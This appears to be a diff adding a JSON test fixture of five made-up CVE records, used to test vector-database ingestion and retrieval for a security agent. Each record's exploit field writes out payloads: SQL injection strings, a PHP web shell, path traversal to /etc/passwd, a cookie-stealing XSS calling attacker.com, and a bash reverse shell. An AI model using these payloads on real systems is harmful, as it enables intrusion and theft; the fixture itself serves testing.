@@ -1,0 +1,78 @@
+# =============================================================================
+# dummy_data/cve_records/cve_records.json
+# PURPOSE: Fake CVE records for testing ChromaDB ingestion and agent retrieval
+#          without hitting the real NVD API.
+# USED BY: tests/unit/test_memory.py, knowledge_base/nvd_scraper.py (dev mode)
+# =============================================================================
+
+[
+  {
+    "cve_id": "CVE-2024-1001",
+    "description": "A SQL injection vulnerability in ExampleCMS 3.2 allows unauthenticated attackers to execute arbitrary SQL commands via the 'id' parameter in the search endpoint. The vulnerability exists due to insufficient input sanitization before passing user-supplied data to the database query.",
+    "cvss_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "cwe_ids": ["CWE-89"],
+    "affected_technology": "ExampleCMS 3.2",
+    "published_date": "2024-01-15",
+    "exploit_methodology": "Send HTTP GET request to /search?id=1' OR '1'='1 to bypass authentication. Use UNION-based extraction to dump database contents: /search?id=1 UNION SELECT username,password,3 FROM users--",
+    "patch_summary": "Replace string concatenation in search() function with PDO prepared statements. Validate and cast 'id' parameter as integer before use.",
+    "references": [
+      "https://github.com/example/examplecms/commit/abc123",
+      "https://exploit-db.com/exploits/99001"
+    ]
+  },
+  {
+    "cve_id": "CVE-2024-1002",
+    "description": "An unauthenticated remote code execution vulnerability in FileUploadPro 1.4 allows attackers to upload arbitrary PHP files via the file upload endpoint. The application fails to validate file extensions and MIME types, allowing web shell upload and subsequent execution.",
+    "cvss_score": 9.9,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+    "cwe_ids": ["CWE-434", "CWE-78"],
+    "affected_technology": "FileUploadPro 1.4",
+    "published_date": "2024-02-03",
+    "exploit_methodology": "POST multipart/form-data to /upload with a PHP web shell (shell.php containing <?php system($_GET['cmd']); ?>). Access uploaded shell at /uploads/shell.php?cmd=id to confirm RCE.",
+    "patch_summary": "Implement strict whitelist of allowed extensions (.jpg, .png, .pdf only). Validate MIME type server-side. Rename uploaded files to random UUID. Store uploads outside web root.",
+    "references": [
+      "https://github.com/fileuploadpro/fileuploadpro/commit/def456"
+    ]
+  },
+  {
+    "cve_id": "CVE-2024-1003",
+    "description": "A path traversal vulnerability in DocServer 2.1 allows authenticated attackers to read arbitrary files outside the web root via the 'file' parameter in the document download endpoint. The application fails to sanitize '../' sequences.",
+    "cvss_score": 9.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+    "cwe_ids": ["CWE-22"],
+    "affected_technology": "DocServer 2.1",
+    "published_date": "2024-03-10",
+    "exploit_methodology": "Send GET /download?file=../../../../etc/passwd to read system files. Use /download?file=../../../../var/www/html/config.php to extract database credentials.",
+    "patch_summary": "Use realpath() to resolve the full path and verify it starts with the allowed base directory. Reject any path containing '../' sequences before resolution.",
+    "references": [
+      "https://github.com/docserver/docserver/commit/ghi789"
+    ]
+  },
+  {
+    "cve_id": "CVE-2024-1004",
+    "description": "A cross-site scripting (XSS) vulnerability in CommentBoard 5.0 allows unauthenticated attackers to inject arbitrary JavaScript via the comment body field. The application stores and renders comments without sanitization, enabling stored XSS attacks.",
+    "cvss_score": 9.0,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N",
+    "cwe_ids": ["CWE-79"],
+    "affected_technology": "CommentBoard 5.0",
+    "published_date": "2024-04-22",
+    "exploit_methodology": "POST to /comment with body: <script>document.location='http://attacker.com/steal?c='+document.cookie</script>. When admin views comments, session cookie is exfiltrated.",
+    "patch_summary": "HTML-encode all user-supplied content before rendering. Use Content Security Policy headers. Implement server-side input validation with allowlist of permitted HTML tags.",
+    "references": []
+  },
+  {
+    "cve_id": "CVE-2024-1005",
+    "description": "An OS command injection vulnerability in NetworkTool 3.0 allows authenticated attackers to execute arbitrary system commands via the 'host' parameter in the ping diagnostic endpoint. User input is passed directly to a shell command without sanitization.",
+    "cvss_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+    "cwe_ids": ["CWE-78"],
+    "affected_technology": "NetworkTool 3.0",
+    "published_date": "2024-05-18",
+    "exploit_methodology": "POST to /ping with host=127.0.0.1; id to inject commands. Use host=127.0.0.1; cat /etc/passwd to read files. Establish reverse shell with host=127.0.0.1; bash -i >& /dev/tcp/attacker/4444 0>&1",
+    "patch_summary": "Use subprocess with argument list (never shell=True). Validate host parameter against strict regex (IP address or hostname pattern only). Reject any input containing shell metacharacters.",
+    "references": [
+      "https://github.com/networktool/networktool/commit/jkl012"
+    ]
+  }
+]
